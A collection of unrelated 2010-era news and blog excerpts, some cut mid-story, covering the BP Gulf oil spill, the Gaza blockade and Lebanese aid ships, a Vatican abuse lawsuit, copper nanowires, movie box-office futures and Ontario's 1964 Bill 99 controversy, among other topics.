It 's a point that has been made by many , who have suggested protesters should only boycott BP products , like Castrol motor oil , but Mr Kearns is not convinced .
" The proprietors are used as human shields , " he says .
TONY HAYWARD AND THE PR DRIVE
One lightning rod for anti-BP rage has proved to be chief executive Tony Hayward .
Remarks he made at the weekend , when he suggested he wanted the spill to be over and said " I 'd like my life back " generated a wave of ire .
By Wednesday he had to apologise , but bloggers have unkindly noted that BP has had a second gusher in the form of Mr Hayward 's gaffe - prone mouth .
Some newspaper and television commentators have demanded his resignation .
One national station ran a segment called " Fired Up ! He 's Gotta Go " .
And the idea that BP is spending money on print and television adverts has also drawn criticism - a case of a PR drive proving to be bad PR .
One Facebook commenter captured the mood , saying : " BP invests in a $ 50 m ad campaign , NOW ?
That is a huge waste of $ 50 m that should be going towards the CLEAN UP .
Come on BP - have the fumes gone to your brains already ?? ? "
BP has already had to explain that no money is being diverted from the clean - up effort .
OTHER PROTESTS
Image caption Mass demonstrations are yet to occur
While on the Gulf coast it is easy to see banners and placards attacking BP , the signs of rage may not be visible everywhere .
The umbrella group seizeBP.org , which wants the federal government to take all of BP 's assets as punishment for the spill , is organising nationwide protests .
But a demonstration at a BP - related site in Washington DC on Thursday only attracted a couple of dozen protesters .
Whether the anger will build into mass demonstrations is unclear .
WHY AREN'T PEOPLE MORE ANGRY ?
While it is clear that millions are outraged , their response is not always visible , particularly away from the Gulf states .
Image caption
Where the oil is , or is headed , feelings run high
" People do n't feel at liberty to speak of it [ in Louisiana ] , they are dependent on BP to pay them , " says David Kearns .
" In Florida , people do n't want to say too much because it 's going to hurt tourism . "
But he thinks the longer the effects of the spill last , the more rage will build .
" It 's true we need to be more angry , " he says .

Edmund Sanders of the LAT puts the matter correctly when he says that Israel ’s national security government ( a subset of key cabinet ministers ) took a “ small step ” Sunday in announcing a further easing of the Israeli blockade of civilian Palestinians in the Gaza strip .
The new policy is said to envision the abolition of the list of permitted items in favor of a small list of goods not permitted because they have military uses .
But the Israelis can continue the blockade even with a smaller list of prohibited items by limiting truck traffic through the checkpoints .
That traffic is tiny now compared to the period before 2006 , and Sunday ’s announcement may not increase it that much .
I wrote on Friday , “ For one thing , how many items are let in is less important than the volume of each .
The Irish Times quotes Robert Serry , the head of the Office for the Co-ordination of Humanitarian Affairs ( OCHA ) .
During the first week in June , imports declined by a quarter , even though Israel expanded the list of allowed imports by 11 food and health items .
OCHA says that the amount of staples and aid going into Gaza is only about 17 % of the goods routinely allowed in before the blockade began .
So an ‘ easing ’ would not even restore the status quo ante of pre-2007 . ”
The USG Open Source Center translated a report from Jerusalem Voice of Israel Network B in Hebrew on Sunday June 20 saying ,
‘ “ The coordinator of government activities in the territories informed the PA tonight that as of tomorrow morning , the number of trucks crossing through Kerem Shalom will be daily increased by 30 % .
Our correspondent Karmela Menashe reports that this will allow the daily entry of 140 trucks into the Gaza Strip through the Kerem Shalom crossing . ’
If the increase is only 30 % of the present truck traffic , that would be about 23 % of the trucks that routinely traveled into Gaza before the blockade , up from the 17 % of the pre-blockade number that has been characteristic in the past year .
A “ small step ” indeed .
This small step was clearly impelled by fear of increased international condemnation by one country after another if the harsher blockade was kept in place .
Further , there is a growing danger to Israel of international boycotts over its Apartheid policies .
Even in Oakland , Ca. , not to mention Stockholm .
Since the steps announced Sunday will not in fact allow for a decent life for the Palestinians of Gaza , nor will they address their massive unemployment and poverty , they are unlikely entirely to relieve this pressure from global civil society .
The small change was also impelled by fear of the further 8 aid ships now planned by humanitarian aid workers for Gaza , each of which Israel is pledged to board and divert .
That is 8 opportunities for further disasters like that aboard the ill - fated Turkish aid vessel , the Mavi Marmara , where one American and 8 Turks were shot to death by Israeli commandos .
The next confrontation is likely to be with two aid ships from Lebanon , organized by women ’s groups , including Christian ones .
The Mariam is named for Mother Mary .
On last Thursday , “ Dozens of Christian and Muslim women gathered in prayer in a cave near Our Lady of Mantara in the town of Maghdushe , where Mary was said to have waited for Jesus while he was preaching nearby some 2,000 years ago ” according to AFP .
Rima Farah told AFP , “ The participants are committed to making progress and our only weapons are faith in the Virgin Mary and in humanity . ”
She also said expressed confidence that their prayers were being answered , in light of Israeli announcements about the easing of the blockade .
Another all - woman aid vessel , the Julia , has received permission from Lebanese Public Works and Transportation Minister Ghazi Aridi to set sail from Tripoli for Cyprus .
He says it is none of his business where it goes after that .
This procedure is a way of getting around Israeli threats of reprisals against Lebanon if its government lets the aid ships leave directly for Gaza from a Lebanese port .
This way , Lebanon can insist that all it did was give the ships permission to leave for Cyprus .
( Lebanese law also forbids him to authorize departure for Israeli - controlled ports , or for any ports where they do not have permission to land ) .
If the ships depart Cyprus for Gaza , that step is unlikely to result in an Israeli strike on Nicosia , since Cyprus and Israel are not at war and Greece would rather mind .
Al - Hayat [ Life ] , reporting in Arabic , says that Israeli radio carried assertions from sources in the Israeli foreign ministry that these two ships are actually backed by the Lebanese Shiite fundamentalist party - militia , Hizbullah .
They said that the party forbade singer Haifa Wahbi to board the ships , on the grounds that her steamy music videos would overshadow the mission and give the wrong impression of it .
But this ridiculous charge is just a piece of gossip picked up from the Kuwaiti newspaper al - Siyasah , which is rather distant from the scene .
In fact , Haifa herself expressed bewilderment at the report , saying she had never registered to be a passenger on the Mariam , and Hizbullah if anything was even more astonished .
I ’ll let you decide if this looks to you like someone who pays attention to Hizbullah .
That the Israeli foreign ministry is taking ridiculous gossip seriously as a basis for making foreign and possibly military policy is a sign of serious derangement .
And if Israel attacks these ships on the assumption that they are Hizbullah , it will not go well for the Netanyahu government .
At some level , at least the few Labor Party members of the cabinet know this , and they , including Industry , Labor , and Trade Minister Binyamin Ben-Eliezer , appear to be the ones who behind the scenes pushed hardest for the ‘ easing ’ of the blockade on Gaza .
In fact , these female Lebanese aid ships are not affiliated to Hizbullah , which declines even verbally to support them , saying that it disapproves of the risk they are taking , of a confrontation that could harm the innocent civilians involved .
There is , on the contrary , a strong Catholic overtone to the missions .
About 15 % of Palestinians are Christian , and the Catholic Church is among the few Western institutions that protests the horrible way the Palestinians have been treated .
About 22 % of Lebanese are Maronite Catholics , a uniate church that recognized the Pope in the early modern period but retains a Syriac liturgy .
An Israeli attack on these unarmed women on a mission of mercy would be a further public relations disaster for Tel Aviv .

BP CEO Tony Hayward takes questions while testifying about the BP oil spill in the Gulf of Mexico , at a House Energy and Commerce Committee hearing on Capitol Hill in Washington , June 17 , 2010 .
REUTERS / Kevin Lamarque
MIAMI ( Reuters ) -
An e-mail scam featuring someone purporting to be BP Plc ’s Chief Executive Tony Hayward is targeting victims of the company ’s massive Gulf of Mexico oil spill , Florida ’s attorney general said on Thursday .
Attorney General Bill McCollum issued a consumer advisory warning Floridians about the “ phishing ” scam , saying it appeared to have originated in Nigeria and had been referred to the United States Postal Inspection Service for investigation .
According to McCollum , authorities were advised of the scheme by a Florida woman who got an e-mail from someone identifying himself as Hayward , the CEO of BP .
The e-mail promised that by replying to it , and providing personal information , the person would become the recipient of $ 500,000 in “ grant funding from BP , ” McCollum said .
“ Scammers and con artists are brazenly trying to capitalize on Floridians who have been affected by the Deepwater Horizon disaster , ” said McCollum .
“ Consumers should be on high alert and should report suspicious e-mails such as this one to my office immediately , ” he said .
Hayward , the public face of BP after the massive Gulf of Mexico oil spill , has been widely criticized over a series of public relations gaffes that stoked U.S. anger at the British energy giant .
During a yearlong string of shootings before his arrest in the summer of 1977 , David Berkowitz , known as the Son of Sam , killed six people and wounded seven others in New York City .
Upon his confession to the shootings , the portrait of the serial killer that emerged was of a deeply disturbed loner , a man with a . 44 - caliber handgun who said he took orders from a demonic black Labrador retriever owned by a neighbor .
But in the years Mr. Berkowitz has been serving a 25 - year - to - life sentence , he has been anything but alone .
He has , it turns out , attracted an array of individuals from outside prison who , though they deplore his murderous past , have become friends , acquaintances and in some instances a kind of ad hoc set of assistants .
This circle of admirers , to a great degree , is made up of evangelical Christians , including a Town and Village Courts judge in upstate New York and a financial adviser in Manhattan , who have been moved by Mr. Berkowitz ’s story of becoming a born - again Christian 23 years ago , and many of them have sought to publicize his account of redemption .
WASHINGTON ( Reuters ) - Rotavirus vaccines made by GlaxoSmithKline Plc and Merck & Co Inc are safe to use despite being contaminated with a pig virus , U.S. health regulators ruled on Friday .
The Food and Drug administration , in a statement , said it was safe for doctors to resume giving patients Glaxo ’s Rotarix and continue using Merck ’s Rotateq .
The agency said there was no evidence the contamination caused any harm and the vaccines were important in preventing hospitalizations and death .
Rotavirus can cause fatal diarrhea .
Both vaccines target the virus , but pieces of DNA from porcine circovirus ( PCV ) have been found in both companies ’ products .
The FDA ’s decision follows a May 7 recommendation by its advisory panel , which ruled that the risk to humans from the pig virus was theoretical at best .
It called for continued use of the vaccines , saying their benefits outweighed any potential risk .
Some strains of the pig virus are believed to cause a wasting syndrome in young piglets , marked by diarrhea and an inability to gain weight , but they are not known to injure humans .
Tests found DNA from the virus in master cells used to make the Glaxo ’s product .
Glaxo officials have said the DNA may have come from a pig - derived enzyme called trypsin used early in development .
The company has said there is no manufacturing or safety issue with its vaccine .
Merck has also said its product is safe .
Neither vaccine is a blockbuster product .
Sales of Merck ’s vaccine totaled $ 522 million in 2009 , including $ 468 million in the United States .
Glaxo ’s rotavirus vaccine sales in 2009 were $ 440 million globally , including $ 118 million in the United States .
Worldwide , rotavirus kills more than 500,000 infants each year , mostly in low - and middle - income countries .
Deaths are rare in the United States , but severe illness that requires a hospital stay is possible .
Glaxo ’s vaccine won U.S. approval in 2008 .
Well , you had to see this one coming ...
Turns out Merrill Lynch did n't just sell CDOs to " sophisticated " institutional investors .
It also sold them to individual investors who thought they were sophisticated .
Yes , those individual investors lost their shirts .
And , yes , now they 're saying they were n't very sophisticated , after all .
( Sophistication was n't much of a defense against losing your shirt on CDOs , by the way .
Merrill lost its own shirt on CDOs .
But Merrill has no one to sue for that .
The shareholders just took it in the teeth ) .
The devil 's in the details in these things .
Sometimes investors beg their financial advisors to get them into some of that high - octane stuff that the pros buy .
Sometimes , the advisors just sell their clients stuff they never should have bought ( in part because the advisors themselves do n't understand the risks ) .
And sometimes the " product " people at firms tell the advisors to sell all sorts of stuff they should n't be selling .
So , without details , it 's hard to say who 's in the wrong here .
But it seems safe to say that it would be a rare breed of individual investor indeed who should be dumping their nest egg into CDOs ...
Dan Fitzpatrick , WSJ :
" We were just lambs being led to the slaughter , " said Michael Slomak , a member of a Cleveland family that he says invested $ 2.65 million in several Merrill - issued CDOs .
He says these structured securities , typically based on a pool of debt such as mortgages , had a level of risk that was never adequately explained .
The family lost all but $ 16,500 , according to an arbitration claim the family brought against Merrill before the Financial Industry Regulatory Authority .
Merrill , now part of Bank of America Corp. , did n't provide its response , but a Merrill spokesman said that a " very small percentage " of its CDO sales were sold to individuals and that these buyers had more money than the average investor .

In order to obtain a permit for offshore drilling , you obviously need a plan for the event of a catastrophe , such as the environmental disaster in the Gulf of Mexico caused by the Deepwater Horizon oil spill .
Lawmakers this week examined British Petroleum ’s ( BP ) , as well as other oil companies , plans in light of “ BP ’s struggle to contain the spill ” , according to the Wall Street Journal .
From listing a dead wildlife expert to protecting extinct walruses , the credibility of these declarations is questionable and been termed “ cookie cutter ” .
Photo by IBRRC
BP is not the only oil giant to have offshore oil plans full of flaws .
The Wall Street Journal explains :
Mr. Markey said a review of oil - company response plans on file with the government for wells in the Gulf region found that BP , Exxon Mobil , Chevron and Conoco Phillips had made references to protecting walruses , “ which have not called the Gulf of Mexico home for three million years . ” …
Mr. Mulva said it was also “ embarrassing ” that his company ’s spill - response plan referred to Dr. Lutz after his death , though he and Mr. Tillerson emphasized that Dr. Lutz was one of multiple experts identified as points of contacts in the event of a spill that required such outside expertise .
BP has been making matters worse by using the toxic chemical dispersant Corexit 9500 .
In fact , Corexit 9500 is “ four times as toxic as the oil itself ” .
The US Environmental Protection Agency ( EPA ) had ordered BP to stop using this toxic chemical at the end of May .
Corexit 9500 in the Gulf may cause toxic rain all over the eastern United States .
Corexit 9500 works as a dispersant both under water and on the surface .
Currently , the EPA has authorized BP to use a “ maximum of 15,000 gallons per day “ .
The EPA explains , “ While dispersants have been used in previous oil spills , this is the largest application of dispersants at an oil spill response in the United States . ”
BP spill - response plan was written for disaster of greater magnitude than the current spill .
According to the Wall Street Journal :
The company had claimed to have in place sufficient booms , stocks of dispersants and skimmers to deal with a spill far in excess of the volume it is now struggling to contain , and placed low probabilities on oil reaching land in the event of a major spill .
The United States government and the oil companies are obviously to blame for not being prepared for the Gulf oil spill disaster .
Including a species that has been extinct in the region for three million years , as well as listing dead wildlife experts are blatant flaws that should have been caught prior to any permit approval .
Furthermore , toxic dispersants are not a viable option for containment and clean up .
BP did just announce a $ 5 million grant to Louisiana State University ( LSU ) for research into the oil and dispersant ’s impact ; however , this information will come too late to mitigate the effects of the Deepwater Horizon disaster .
The US Supreme Court on Monday declined to examine whether an Oregon resident who allegedly was sexually molested by a Roman Catholic priest as a teenager in the 1960s can sue the Vatican for his abuse .
The move allows the litigation to move forward toward a trial .
A federal judge and a federal appeals court had ruled earlier that the lawsuit could go forward .
Lawyers for the Vatican , also known as the Holy See , asked the high court to take up the case and dismiss it .
They argued that the Vatican could not be held legally responsible for alleged criminal acts undertaken by a priest when those illegal acts were unrelated to his work for the Roman Catholic Church .
At issue was whether the Vatican , a foreign sovereign nation , can be forced to pay money damages to a US citizen for the alleged illegal acts of one of its employees .
Most priests do not have deep pockets to pay such claims .
The Vatican does .
Foreign nations are generally immune from lawsuits .
But under the Foreign Sovereign Immunities Act , Congress said a foreign nation can be sued in a US court if the harmful act was carried out by an official or employee of the foreign state “ while acting within the scope of his office or employment . ”
“ Sexual abuse is clearly outside the scope of a priest ’s employment , ” Vatican lawyers said in their brief .
The victim is identified in the lawsuit by the pseudonym John V. Doe .
His lawyers say the Vatican is partly responsible for the sexual abuse their client endured as a teenager .
According to court documents , the priest , Fr. Andrew Ronan , had admitted to sexually abusing a boy in the Archdiocese of Benburb , Ireland .
He was transferred by church officials to the all - boys St. Philips High School in Chicago , where he later admitted to sexually abusing three boys .
Church officials then transferred Ronan to St. Albans Church in Portland , Ore .
That ’s where he allegedly sexually abused Doe .
Lawyers for
Doe concede that sexual abuse is not an authorized part of a priest ’s job description .
But that does n’t mean the abuse was unrelated to the priest ’s work on behalf of the Catholic Church , they argued .
Ronan used his position as a trusted member of the clergy to gain access to children , they said .
He then used the respect and stature granted him by the church to groom
Doe for the sexual abuse he was planning , Doe ’s lawyers said .
“ The trust formed through the performance of Ronan ’s spiritual duties as an agent of the Holy See and the Roman Catholic Church enabled Ronan to molest [ Doe ] despite the knowledge of his proclivities by his employer , ” wrote lawyer Marci Hamilton in her brief on behalf of Doe .
“ The development of a unique bond between Ronan and [ Doe ] in the course of their relationship as pastor and parishioner created the conditions necessary for the sexually predatory behavior to happen , ” she wrote .
The case was Holy See v. John V. Doe .

California welfare recipients withdrew more than $ 1.8 million in taxpayer cash on casino floors between October 2009 and May 2010 , state officials said Thursday .
Gov. Arnold Schwarzenegger also issued an executive order Thursday requiring welfare recipients to sign a pledge that they will use their cash benefits only to “ meet the basic subsistence needs ” of their families .
It gave the state Department of Social Services seven days to produce a plan to reduce other types of “ waste , fraud and abuse ” in the welfare program .
The moves come in response to a Los Angeles Times story describing how Department of Social Services officials failed to notice that the debit cards they issue to welfare recipients could be used at more than half of the tribal casinos and state - licensed poker rooms in California .

The International Cycling Union will examine so - called " mechanical doping " at a meeting next week with bike manufacturers .
UCI president Pat McQuaid said Wednesday he did not believe rumors sweeping the sport that racers were cheating by getting extra power from battery - powered motors hidden in their bike frames .
" We have no belief at the moment that it 's actually a fact , " McQuaid told The Associated Press in a telephone interview .
But he said the subject is on the agenda of a routine meeting between the UCI and industry representatives next Monday .
" We want to make sure that , as batteries on bikes progress , the UCI is in a position to monitor completely any usage there might be in an unfair way , " McQuaid said .
Motors that can be attached to a bicycle have been commercially available for several years , but existing models require a battery carried visibly in a saddle bag .
McQuaid said the UCI has no knowledge of motors that could be hidden inside the tubes of a frame .
" They are still not invisible , " he said .
" All the evidence we 're seeing ... is that the battery is about the size of a bag of sugar . "
McQuaid said the UCI has contacted former racer Davide Cassani , who says he has tested a motorized bike that could help a rider cheat .
Cassani's reports for Italian television have fueled speculation that mechanical doping could rival performance - enhancing drugs as a threat to the sport .
" This is a story that has gone around the world like wildfire , whereas there is no foundation for it , " McQuaid said .
The microbiome first came to light in the mid-1600s , when the Dutch lens - grinder Antonie van Leeuwenhoek scraped the scum off his teeth , placed it under a microscope and discovered that it contained swimming creatures .
Later generations of microbiologists continued to study microbes from our bodies , but they could only study the ones that could survive in a laboratory .
For many species , this exile meant death .
In recent years , scientists have started to survey the microbiome in a new way : by gathering DNA .
They scrape the skin or take a cheek swab and pull out the genetic material .
Getting the DNA is fairly easy .
Sequencing and making sense of it is hard , however , because a single sample may yield millions of fragments of DNA from hundreds of different species .
A number of teams are working together to tackle this problem in a systematic way .
Dr. Weinstock is part of the biggest of these initiatives , known as the Human Microbiome Project .
The $ 150 million initiative was started in 2007 by the National Institutes of Health .
The project team is gathering samples from 18 different sites on the bodies of 300 volunteers .
To make sense of the genes that they ’re gathering , they are sequencing the entire genomes of some 900 species that have been cultivated in the lab .
Before the project , scientists had only sequenced about 20 species in the microbiome .
In May , the scientists published details on the first 178 genomes .
They discovered 29,693 genes that are unlike any known genes .
( The entire human genome contains only around 20,000 protein - coding genes . )
“ This was quite surprising to us , because these are organisms that have been studied for a long time , ” said Karen E. Nelson of the J. Craig Venter Institute in Rockville , Md .
The new surveys are helping scientists understand the many ecosystems our bodies offer microbes .
In the mouth alone , Dr. Relman estimates , there are between 500 and 1,000 species .
“ It has n’t reached a plateau yet : the more people you look at , the more species you get , ” he said .
The mouth in turn is divided up into smaller ecosystems , like the tongue , the gums , the teeth .
Each tooth — and even each side of each tooth — has a different combination of species .
Scientists are even discovering ecosystems in our bodies where they were n’t supposed to exist .
Lungs have traditionally been considered to be sterile because microbiologists have never been able to rear microbes from them .
A team of scientists at Imperial College London recently went hunting for DNA instead .
Analyzing lung samples from healthy volunteers , they discovered 128 species of bacteria .
Every square centimeter of our lungs is home to 2,000 microbes .
” Copper Nanowires can now be ‘ grown ’ in bulk and then ‘ printed ’ on a surface to transparently conduct current ! ”
– Benjamin Wiley , Duke Chemistry
Most people probably do n’t realize that thin film solar panels and flat screen TV ’s share alot in common , since they both rely heavily on the technologies of ‘ thin - film dialectrics ’ ( TFD ) to produce the substrates ( electrode layers ) that control either the emission or absorption of light .
So obviously , any advances made in the manufacturing processes for these films could create both cost and technical efficiencies that would enable TFD ’s to either consume less power , or generate more energy on an even cost basis for a given amount of light .
This would be no small achievement if you consider the growing demand for efficient display screens , and the persistent cost barriers to all the solar panels that people are hoping to install in the very near Future .
The exciting Science News here is that new discoveries in copper - based ‘ Nano Tech ’ are offering the first cheaper and efficient alternatives to existing methods that we ’ve seen in quite awhile , and could genuinely change the surface of playing field if Cu- based nanotech can continue to overcome the hurdles of establishing a brand new TFD process .
Currently the status quo of TFD manufacturing is based in a predominance of electrode films made from Indium Tin Oxide ( ITO ) , and this rather expensive method still has quite a few nagging drawbacks .
First of all , ITO is pricey to process , it ’s also brittle and thus fragile ; so its production process remains highly inefficient ; and it ’s already an expensive technology that ’s becoming even more costly because of the dual increases in market demand ( scarcity ) for both raw materials and the finished product .
Currently the only alternatives we see on the horizon are coming from nano technology that uses either silver or carbon nano - tubes – which both remain highly cost prohibitive and difficult to produce .
However a research team at Duke University have recently announced that they ’ve perfected a method to grow nanowires from Copper , which promises to dramatically reduce not only the manufacturing demands for these thin films , but also allow for them to be much more flexible , durable , and cost efficient – Especially since copper is an abundant resource who ’s price ca n’t be as easily cornered and manipulated by merchants and market forces …
Benjamin Wiley , an assistant professor of chemistry at Duke University , and his students , PhD candidate Aaron Rathmell and undergraduate Stephen Bergin , grew the copper nanowires in a water - based solution that promises to radically change the manufacturing process for transparent TFD’s .
“ By adding different chemicals to the solution , you can control the assembly of atoms into different nanostructures , ” Wiley said .
In this case , when the copper crystallizes , it first forms tiny “ seeds , ” and then a single nanowire sprouts from each seed .
It ’s a mechanism of crystal growth that has never been observed before .
Because the copper nanowires are flexible and in an aqueous solution , the Duke team envisions them being manufactured in a roll - to - roll system similar to newspaper printing , which would be a dramatic simplification over current methods .
The particles are also so small , that they will be transparent to light sources , which makes them ideal for display screens and photo - voltaic solar films .
“ If we are going to have these ubiquitous electronics and solar cells , ” Wiley said , “ we need to use materials that are abundant in the earth ’s crust and do n’t take much energy to extract . ”
There are very few materials that are both conductive and transparent , which is why Indium based materials are still the standard .
However copper nanotubes stand poised to change all that with the new “ growth ’ process that is being perfected at Duke , and is already in the process of being patented .
In order to scale the carbon tube process up to commercial production levels though , the team still needs to find a method of preventing the nanowires from clumping as they grow , which reduces transparency , and also preventing the copper from oxidizing , which decreases their conductivity .
Once this is accomplished , will have a TFD material that will be much cheaper to both produce , and work with than Indium or Silver based dielectrics , while producing results at the same level of performance .
The trick here , according to some experts and pundits , will be getting to a high aspect ratio on the wires ( ie. realllly long wires ) .
At this stage , they can get only get ~65 % transparency , which is already pretty consistent in the 400 - 1000nm wavelength range .
If they could replicate the transparency of Silver ( Ag nanotech ) they ’d really have something impressive to boast about .
Estimates are made that this CU nanotech could lop off 0.10 - 0.30 $ / W.
Which is pretty dramatic when you consider that Solar is currently sitting at about 0.80 $ / W.
So with copper being a thousand times more abundant than Indium , and 100 times cheaper to work with , there ’s no doubt that the existing investors in silver nanotube technologies , could soon be seeing some of the light that copper is promising to produce in the near future .

When I started telling people that I was going to write a story about prices at Walmart and Target , almost everyone had a strong opinion about the comparison .
From previous experience , I know stories like that can be a goldmine or a quagmire , and that in cases where opinions battle opinions , it is comfortable and exciting to be able to provide more factual information to the debate .
This story is about comparing prices at Walmart and Target in Sacramento , California in March of 2005 .
I did n't want to skew the results , so it was important to take a few steps to set up a fair comparison .
With Stacy 's help , and before visiting either store , I prepared a shopping list of 20 items .
Some items were specific brands and packages , such as the 32oz .
bottle of Windex glass cleaner with pump .
Other items were more broadly described , such as " basketball " , where I would track down the price of the cheapest basketball that the store offered .
For anyone that has ever tried exploiting a price - match guarantee , you know how difficult it can be to find the exact same item in two different stores , so I hoped this " cheapest version " allowance would work out .
With Oliver Stone 's Wall Street 2 placing financial trading back in Hollywood 's crosshairs , it is perhaps fitting that the film industry is itself set to become a target for the money men .
The US authorities yesterday approved the creation of the first futures market based on movie box office results , a move that has aroused fear among the studios about traders speculating on the financial success of films .
The new market was approved by the US Commodity Futures Trading Commission ( CFTC ) .
The Motion Pictures Association of America ( MPAA ) , which represents the major studios , has long opposed such a move , arguing that it may hurt the performance of films as traders begin looking for ways to manipulate a movie 's opening .
It has called for a ban on such practices .
In a statement , the MPAA said movie futures speculation was " no more than over - under bets on a movie 's performance " .
They added : " It is unfortunate the CFTC has now given the go - ahead to a new gambling platform that could be plagued by financial irregularities and manipulation . "
However , proponent Robert Swagger told the Hollywood Reporter that the MPAA was trying to suppress small business initiatives at a time of economic troubles .
" We know the MPAA will stop at nothing , " he said .
" They are a huge special interest group .
They do n't have to use this product , but there are a lot of other people who can and who will benefit from it .
" The MPAA can't accept the fact that the regulatory body , the CFTC , has read through everything , that we worked with them for over a year , and they concluded these products do fall under their domain – that they can't be manipulated , that they are a commodity . "
The new futures contracts will commence trading four weeks before a movie opens and end trading as it enters its opening weekend .
The first movie to enter the market may be crime thriller Takers , which arrives in US cinemas on 20 August .
Futures markets were initially set up to allow traders to " hedge " against the possible future performances of companies , a move which helped to reduce uncomfortable spikes in economic results .
news Historicist : Kill Bill 99
Every Saturday at noon , Historicist looks back at the events , places , and characters — good and bad — that have shaped Toronto into the city we know today .
Justice being stomped upon by the proposed amendments to the Police Act .
The Telegram , March 20 , 1964 .
In the fallout of the G20 summit , much has been made about the treatment of civil liberties by the police and various levels of government .
Some commentators have drawn parallels between the extended powers bestowed upon law enforcement during the summit with legislation the Ontario government attempted to pass nearly fifty years ago .
The amendments to the Police Act put forward in Bill 99 provoked mass outrage from the public and politicians , including those within the government of Premier John Robarts .
For nearly a week , most observers sat back and scratched their heads as they watched a circus unfold at Queen ’s Park that could have been prevented if more care had been taken in thinking about the implications of the bill .
Headline , the Globe and Mail , March 20 , 1964 .
The figure at the centre of the storm was Attorney General Frederick Cass .
The small town lawyer , whose maternal relatives developed the McIntosh apple , developed a reputation in several government portfolios as a no - nonsense taskmaster with a short fuse .
Since his appointment as attorney general in late 1962 , he had overseen a report conducted by Judge Bruce Macdonald that would revise the Police Act to allow law enforcement to battle a perceived increase in organized crime and Mafia activities in the province .
The spectre of gang wars had been one of the provincial Liberals ’ main campaigning points during the 1963 Ontario election and it was felt in some quarters that the governing Progressive Conservatives had to show they were n’t soft on crime regardless of the true level of the mobster menace .
There were signs something unusual was up when the report was released on March 19 , 1964 .
Reporters reviewing its contents were locked in a room for six hours under an OPP watch that included supervised bathroom trips .
Cass dropped by around 9:30 a.m. to answer questions and made it clear that he had disagreed with Macdonald on several sections of the report .
Those perusing the report noticed proposed changes to section 14 of the Police Act that gave the Ontario Police Commission ( OPC ) sweeping powers that suspended normal civil liberties .
The new subsections would allow the OPC to summon anyone and require them to provide evidence in camera .
Legal counsel could be refused until the OPC was satisfied with questioning .
If the person being summoned refused to answer questions or provide requested evidence , the OPC “ may , by warrant , commit the person to prison for a period not exceeding eight clear days ” without bail or appeal .
Once out of jail , if the person continued to refuse to cooperate , not only would another eight - day sentence ensue , but the OPC “ may commit the person to prison from time to time until the person consents to do what is required of him . ”
Those questioned were forbidden to disclose anything that occurred during their hearing — if they did , a two - thousand - dollar fine and a year in jail could result .
Early in the afternoon , Cass quickly outlined the legislation stemming from the report that he intended to bring to the floor that day .
He assured the small number of attendees ( estimated at eleven out of seventy - seven Tory MPPs ) that the proposed amendments to the Police Act were a matter of housekeeping .
As bills in those days were rarely printed before they were given first reading in the legislature , those in attendance accepted Cass ’s explanation without any visible concern .
The bill boomerangs back on Attorney General Fred Cass .
Cartoon by Al Beaton , the Telegram , March 21 , 1964 .
After Bill 99 was tabled for first reading , Cass held a press conference .
He noted that some individual rights would have to be sacrificed for the public good and trusted the OPC to act carefully , then stunned reporters when he suddenly attacked his own bill : “ It ’s drastic , it ’s dangerous , and it ’s new , and it ’s terrible legislation in an English common law country . ”
If the law passed , he mused that a person could be plucked off the street , hauled before the committee and sent to jail without anyone else ’s knowledge .
The question on everyone ’s mind : if this legislation was so repulsive to the minister bringing it to the legislature , why was it being brought forward ?
Around 9 p.m. , during a party thrown by the government for the media corps , Robarts received word that the Globe and Mail had prepared a rare front - page editorial regarding the legislation .
Titled “ Bill of Wrongs , ” the piece lashed out at the government :
“ For the public good , ” the Ontario Government has taken an axe to the fundamental rights and liberties of this province ’s people .
“ For the public good , ” it proposes to trample upon Magna Carta , Habeas Corpus , the Canadian Bill of Rights , and the Rule of Law … Are we in Ontario — or are we in Ghana ?
In the Canada of 1964 — or in the Germany of 1934 ?
This legislation is supposed to be directed against organized crime .
In fact , it is directed against every man and woman in this province …
Cass says of it : “ The rights of a few individuals may have to be overridden for the public good . ”
These rights , which belong to every individual ARE the public good .
Overridden for one man , they are overridden for all .
Where , then , is “ the public good ? ” … This legislation could make Ontario a police state .
It would give the Ontario Police Commission powers comparable with those of the OGPU [ a forerunner of the KGB ] or the Gestapo .
Headline , the Toronto Star , March 20 , 1964 .
The editorial was just the beginning of the torrent of criticism hurled at the government on March 20 .
The Star also published a front - page editorial condemning the government for creating conditions for a police state out of panic :
A case could perhaps be made out for measures such as this in a country ravaged by civil war .
But the only justification the government offers is that these drastic powers are needed to combat crime syndicates from the United States .
A few months ago the cabinet was denying that these syndicates were operating in Ontario at all .
Now they have become , we are told , such an awful menace that the traditional rights and liberties of the people of Ontario must go by the board .
This looks like a reaction of sheer panic …
This law is not aimed at just racketeers and gangsters and their accomplices .
It can be used against anyone — against opponents and critics of the government whom someone in authority has a grudge .
In the hands of corrupt officials it could be used not to repress crime but protect it …
This is the most offensive and dangerous legislation ever introduced in Ontario .
The opposition pounced during the day ’s legislative session .
Acting Liberal leader Farquhar Oliver demanded that the government either dismiss the legislation or call an election .
Tempers flared among the argumentative MPPs — at one point , Speaker Donald Morrow sent the sergeant - at - arms over to Oliver when he refused to yield to the speaker ’s request to allow Robarts to speak .
In an emotional speech , Dovercourt Liberal MPP Andrew Thompson ( later infamous for his tardy attendance record as a senator ) argued that in a British - inspired parliamentary system , a cabinet must stand in solidarity , so the front benchers were as guilty as Cass in creating chaos .
“ We do n’t see this as a political battle , ” he noted , “ but a battle for the sanctity of the people . ”
Thompson ’s speech received applause from the visitor ’s gallery and he was able to ride this positive reaction to become party leader later in the year .
Premier John Robarts gets out the cleaning equipment .
Cartoon by Al Beaton , the Telegram , March 24 , 1964 .
In a statement partly crafted by former premier Leslie Frost , Robarts indicated he would not tolerate draconian legislation and would send the bill back to a committee .
The Liberals continued to shout and , as soon as Robarts finished speaking , Oliver questioned how the bill had gotten so far .
The premier also faced internal opposition from MPPs who had no prior knowledge of the bill and shuddered at its content .
Backbencher Allan Lawrence ( St. George riding ) , known for his frequent dissent with the government , was found by the press after Cass ’s press conference .
When one reporter described the bill , Lawrence replied “ It ca n’t be that …People picked up without charge , incarcerated , denied a lawyer on the mere suspicion of the police ?
If that ’s the case I ’d certainly be against it . ”
After the debate , Lawrence rushed Robarts and indicated there were many on the benches ( including many lawyers like himself ) willing to vote against the legislation due to a mix of personal beliefs and large volumes of calls from irate constituents since 7 a.m .
Outrage quickly spread to Ottawa where MP Reid Scott ( NDP , Toronto - Danforth ) proposed a motion to censure the Ontario government .
Though the speaker ruled it out of order , Scott ’s motion received applause from all parties except the federal Tories , whose leader , John Diefenbaker , looked embarrassed as he fidgeted in his seat .
